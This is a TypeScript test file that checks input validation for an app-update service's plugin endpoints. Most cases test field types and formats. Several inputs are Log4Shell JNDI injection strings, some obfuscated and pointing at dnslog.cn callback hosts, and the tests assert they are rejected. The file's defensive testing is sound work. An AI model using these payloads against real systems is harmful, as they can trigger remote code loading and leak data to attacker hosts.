import type { StandardSchema } from '../supabase/functions/_backend/utils/schema_validation.ts'
import { describe, expect, it } from 'vitest'
import { channelSelfRequestSchema, statsRequestSchema, updateRequestSchema } from '../supabase/functions/_backend/plugin_runtime/utils/plugin_validation.ts'
import { safeParseSchema } from '../supabase/functions/_backend/utils/schema_validation.ts'
import { INVALID_STRING_APP_ID, INVALID_STRING_DEVICE_ID, MISSING_STRING_APP_ID, MISSING_STRING_DEVICE_ID, MISSING_STRING_PLATFORM, MISSING_STRING_VERSION_BUILD, MISSING_STRING_VERSION_NAME, MISSING_STRING_VERSION_OS, NON_STRING_APP_ID, NON_STRING_DEVICE_ID, NON_STRING_PLATFORM, NON_STRING_VERSION_BUILD, NON_STRING_VERSION_NAME, NON_STRING_VERSION_OS } from '../supabase/functions/_backend/utils/utils.ts'

const requestJSON = {
  app_id: 'ee.forgr.demoapp',
  device_id: '9929AFAD-ECF1-4D7F-B0C1-A8CE463C6684',
  version_name: 'builtin',
  version_build: '1.0.1',
  version_code: '1',
  version_os: '16.0',
  platform: 'ios',
  plugin_version: '5.2.18',
  is_prod: false,
  is_emulator: true,
  install_source: 'testflight',
  custom_id: '',
}

const SCHEMAS = {
  '/updates': updateRequestSchema,
  '/stats': statsRequestSchema,
  '/channel_self': channelSelfRequestSchema,
} as const satisfies Record<string, StandardSchema<unknown>>
type Endpoint = keyof typeof SCHEMAS

// `undefined` in a patch removes the field from the request.
type Patch = Record<string, unknown>

function parse(endpoint: Endpoint, patch: Patch) {
  const body: Record<string, unknown> = { ...requestJSON, ...patch }
  for (const [key, value] of Object.entries(patch)) {
    if (value === undefined)
      delete body[key]
  }
  return safeParseSchema(SCHEMAS[endpoint], body)
}

/** Each expected message must be contained in the issue at the same index; [] means the request is valid. */
function expectResult(endpoint: Endpoint, patch: Patch, expectedErrors: string[]) {
  const result = parse(endpoint, patch)
  if (expectedErrors.length === 0) {
    expect(result.success).toBe(true)
    return
  }
  expect(result.success).toBe(false)
  const issues = (result as unknown as { error: { issues: { message: string }[] } }).error.issues
  expectedErrors.forEach((message, index) => {
    expect(issues[index]?.message).toContain(message)
  })
}

const sharedCases: [string, Patch, string[]][] = [
  ['app_id missing', { app_id: undefined }, [MISSING_STRING_APP_ID]],
  ['app_id with underscore is valid', { app_id: 'ee.forgr.demo_app' }, []],
  ['app_id with hyphen is valid', { app_id: 'ee.forgr.demo-app' }, []],
  ['app_id number', { app_id: 1000000000000000000000000000 }, [NON_STRING_APP_ID]],
  ['app_id empty', { app_id: '' }, [INVALID_STRING_APP_ID]],
  ['app_id leading dot', { app_id: '.ee.forgr.demoapp' }, [INVALID_STRING_APP_ID]],
  ['app_id without dots', { app_id: 'eeforgrdemoapp' }, [INVALID_STRING_APP_ID]],
  ['app_id log4shell payload', { app_id: 'app_${indi:${lower:I}${lower:d}a${lower:p}://1694362129451PrwrE.4q0tv0.dnslog.cn/nik}' }, [INVALID_STRING_APP_ID]], // eslint-disable-line no-template-curly-in-string
  ['app_id with plus', { app_id: 'ee.forgr.demo+app' }, [INVALID_STRING_APP_ID]],
  ['app_id with brackets', { app_id: '[appid]' }, [INVALID_STRING_APP_ID]],
  ['device_id missing', { device_id: undefined }, [MISSING_STRING_DEVICE_ID]],
  ['device_id number', { device_id: 2_000_000_000 }, [NON_STRING_DEVICE_ID]],
  ...[
    'ECF1-4D7F-B0C1-A8CE463C6684',
    '9929AFAD-4D7F-B0C1-A8CE463C6684',
    '9929AFAD-ECF1-B0C1-A8CE463C6684',
    '9929AFAD-ECF1-4D7F-B0C1-',
    '9929AFADECF14D7FB0C1A8CE463C6684',
    'A243AFAD-ECF1-4D7F-B0C1-A8CE463C560',
    '',
    'device_${jndi:ldap://1694362129451P}', // eslint-disable-line no-template-curly-in-string
  ].map(device_id => [`device_id invalid ${JSON.stringify(device_id)}`, { device_id }, [INVALID_STRING_DEVICE_ID]] as [string, Patch, string[]]),
  ['device_id length exceeded', { device_id: 'device_${jndi:ldap://1694362129451PrwrE.4q0tv0.dnslog.cn/nik}' }, ['String must contain at most 36 character(s)']], // eslint-disable-line no-template-curly-in-string
  ['version_name missing', { version_name: undefined }, [MISSING_STRING_VERSION_NAME]],
  ['version_name number', { version_name: 300000 }, [NON_STRING_VERSION_NAME]],
  ['version_name boolean', { version_name: true }, [NON_STRING_VERSION_NAME]],
  ['app_id and device_id missing', { app_id: undefined, device_id: undefined }, [MISSING_STRING_APP_ID, MISSING_STRING_DEVICE_ID]],
  ['app_id and device_id are invalid', { app_id: '123456768', device_id: '${jndi:ldap://4q0tv0.dnslog.cn}' }, [INVALID_STRING_APP_ID, INVALID_STRING_DEVICE_ID]], // eslint-disable-line no-template-curly-in-string
]

const endpointCases: [Endpoint, string, Patch, string[]][] = [
  ...sharedCases.flatMap(([name, patch, errors]) => (['/updates', '/stats'] as const).map(endpoint => [endpoint, name, patch, errors] as [Endpoint, string, Patch, string[]])),
  ['/updates', 'rejects empty version_name', { version_name: '' }, [MISSING_STRING_VERSION_NAME]],
  ['/stats', 'accepts empty version_name', { version_name: '' }, []],
  ['/channel_self', 'accepts empty version_name', { version_name: '' }, []],
  ['/updates', 'version_build missing', { version_build: undefined }, [MISSING_STRING_VERSION_BUILD]],
  ['/updates', 'version_build number', { version_build: 4000000 }, [NON_STRING_VERSION_BUILD]],
  ['/updates', 'version_build boolean', { version_build: true }, [NON_STRING_VERSION_BUILD]],
  ['/updates', 'version_build empty', { version_build: '' }, [MISSING_STRING_VERSION_BUILD]],
  ['/channel_self', 'accepts empty version_build', { version_build: '' }, []],
  ['/stats', 'version_os missing', { version_os: undefined }, [MISSING_STRING_VERSION_OS]],
  ['/stats', 'version_os number', { version_os: -5000000 }, [NON_STRING_VERSION_OS]],
  ['/stats', 'version_os boolean', { version_os: false }, [NON_STRING_VERSION_OS]],
  ['/stats', 'platform missing', { platform: undefined }, [MISSING_STRING_PLATFORM]],
  ['/stats', 'platform number', { platform: -6000000 }, [NON_STRING_PLATFORM]],
  ['/stats', 'platform boolean', { platform: true }, [NON_STRING_PLATFORM]],
  ...(['/updates', '/stats', '/channel_self'] as const).flatMap(endpoint => [
    [endpoint, 'install_source valid', { install_source: 'app_store' }, []],
    [endpoint, 'install_source invalid type', { install_source: 123 }, ['install_source must be a string']],
    [endpoint, 'install_source too long', { install_source: 'a'.repeat(65) }, ['String must contain at most 64 character(s)']],
  ] as [Endpoint, string, Patch, string[]][]),
]

describe('plugin request schemas', () => {
  it.each(endpointCases)('%s: %s', (endpoint, _name, patch, expectedErrors) => {
    expectResult(endpoint, patch, expectedErrors)
  })
})
